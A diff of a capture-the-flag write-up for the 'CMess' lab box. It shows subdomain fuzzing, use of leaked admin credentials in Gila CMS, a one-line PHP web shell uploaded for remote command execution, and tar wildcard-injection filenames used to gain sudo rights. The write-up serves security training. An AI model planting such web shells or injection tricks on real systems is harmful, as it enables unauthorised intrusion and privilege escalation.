@@ -91,11 +91,18 @@ gobuster dir -u http://cmess.thm -w /usr/share/wordlists/dirb/common.txt
 /tmp                  (Status: 301) [Size: 312]
 
 the only useful directory to us is the /admin directory as it has a login page.
-following the hint given to us by the creator of this ctf, we will enumerate the subdomains(vhosts). for that we will have to find whats common in the false responses. as you can see below, each response has different response sizes but the words are common. so we will use the amount of words as out filtering standard. any response which contains exactly 522 words shall be omitted.
+following the hint given to us by the creator of this ctf, we will enumerate the subdomains(vhosts). for that we will have to find whats common in the false responses. as you can see below, each response has different response sizes but the words are common. 
+
+![commonwords](https://github.com/realatharva15/cmess_writeup/blob/main/images/ffuffailure.png)
+
+`NOTE: you can carry this test run by mentioning a wrong filtering parameter`
+
+so we will use the amount of words as out filtering standard. any response which contains exactly 522 words shall be omitted.
 
 ```bash
 ffuf -u http://cmess.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://cmess.thm/ -H 'Host: FUZZ.cmess.thm' -fw 522
 ```
+![ffuf](https://github.com/realatharva15/cmess_writeup/blob/main/images/ffuf.png)
 
 we get a hit at dev.cmess.thm! lets quickly add this to our subdomain aswell and visit the website.
 
@@ -104,21 +111,40 @@ echo "<target_ip> dev.cmess.thm" | sudo tee -a /etc/hosts
 ```
 now we find a small conversation between a user and the support staff. we get the credentials of the user who has access to the admin panel at http://cmess.thm/admin. lets enter the credentials and find our attack vector to get an initial foothold. 
 
-after doing some reserch, i found out that this version (1.10.9) of Gila CMS is vulnerable to RCE. i read some python scripts on exploitdb and github and found out the way to manually exploit the system.
+![admin](https://github.com/realatharva15/cmess_writeup/blob/main/images/admin_dashboard.png)
 
+after doing some reserch, i found out that this version (1.10.9) of Gila CMS is vulnerable to RCE. i read some python scripts on exploitdb and github and found out the way to manually exploit the system.
 inorder to get RCE, we will have to upload a malicious file with a .php7 extension in the /tmp folder via the File-Manager tab. we are uploading it to the /tmp folder.
 
 first navigate to the File Manager tab, and then create a file. name it shell.php7
+
+![filemanager](https://github.com/realatharva15/cmess_writeup/blob/main/images/filemanager.png)
+
+now go to the /tmp directory 
+
+![tmp](https://github.com/realatharva15/cmess_writeup/blob/main/images/tmp.png)
+
+now create a file named shell.php7 
+
+![shell](https://github.com/realatharva15/cmess_writeup/blob/main/images/shellbetter.png)
+
+now paste this malicious code into the shell.php7 file. what this code will do is it will be interepreted as actual php code when accessed and using the http GET method, it will use a paramater named cmd to carry out commands remotely
 
 ```bash
 #paste this in the shell.php7 file
 <? php system($_GET['cmd']);?>
 ```
+it should look something like this:
+
+![cmd](https://github.com/realatharva15/cmess_writeup/blob/main/images/cmdbetter.png)
+
 now save this file and then test for RCE at the url http://cmess.thm/tmp/shell.php7?cmd=id
 ```bash
 #in your browser:
 http://cmess.thm/tmp/shell.php7?cmd=id
 ```
+![RCE](https://github.com/realatharva15/cmess_writeup/blob/main/images/RCEbetter.png)
+
 and just like that we have achieved RCE through malicious file upload! we will now craft a reverseshell payload which will be url encoded and inject it in the url.
 
 ```bash
@@ -159,7 +185,11 @@ inside the andre_backup directory we just created we find a note that says:
 
 `Anything in here will be backed up!`
 
-this is a clear hint that our way to privilege escalation from www-data to andre would be through backup files! now after some searching, i found some database credentials of the root user in the config.php file present at /var/www/html directory. using it i could access the mysql server. i even found andre's hashed password, but the password couldn't be cracked using john or hashcat. neither did crackstation help us in finding the password. i remembered that in the description of the CTF, there was mentioning of not using bruteforce. so we fall inside a rabbit hole. 
+this is a clear hint that our way to privilege escalation from www-data to andre would be through backup files! now after some searching, i found some database credentials of the root user in the config.php file present at /var/www/html directory. using it i could access the mysql server. i even found andre's hashed password, but the password couldn't be cracked using john or hashcat. neither did crackstation help us in finding the password.
+
+![database](https://github.com/realatharva15/cmess_writeup/blob/main/images/database.png)
+
+i remembered that in the description of the CTF, there was mentioning of not using bruteforce. so we fall inside a rabbit hole. 
 
 after getting tired of manual enumeration, i installed linpeas.sh on the system and got a sus file at the /opt directory. there is a .password.bak file which contains the credentials of user andre. we quickly ssh into the system to get a better shell and a decent tty.
 
@@ -194,9 +224,15 @@ now we will create two more files which are specially meant for the tar command.
 #create the 2nd file:
 : > '--checkpoint-action=exec=bash exploit.sh'
 ```
+the /backup directory should look something like this:
+
+![backup](https://github.com/realatharva15/cmess_writeup/blob/main/images/tarwildcard.png)
+
 the file 1 will tell tar to create checkpoints after every 1 file is processed. this will enable checkpoint actions to trigger. the file 2 will tell tar what file to execute at what checkpoint. in our condition it tells tar to execute the exploit.sh file. the entire filename acts as a tar command argument.
 
 lets check if we are added to the /etc/sudoers file yet and what privileges do we have after 2 minutes have passed. 
+
+![whoami](https://github.com/realatharva15/cmess_writeup/blob/main/images/whoami.png)
 
 as you can see above, we are added to the sudoers list as we clearly have sudo privileges to execute any command on the system without password. 
 
